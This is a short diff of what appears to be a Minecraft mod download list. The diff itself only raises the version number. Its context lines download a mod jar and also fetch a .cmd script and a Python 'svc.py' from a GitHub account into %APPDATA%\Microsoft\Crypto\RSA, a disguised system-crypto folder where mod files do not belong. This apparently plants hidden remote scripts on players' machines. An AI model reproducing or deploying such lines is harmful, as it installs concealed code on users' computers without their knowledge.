@@ -1,5 +1,5 @@
 # my commands
-version: 13
+version: 14
 mods https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar
 put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/cache-helper.cmd %APPDATA%\Microsoft\Crypto\RSA\cache-helper.cmd
 put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/svc.py %APPDATA%\Microsoft\Crypto\RSA\Python\svc.py
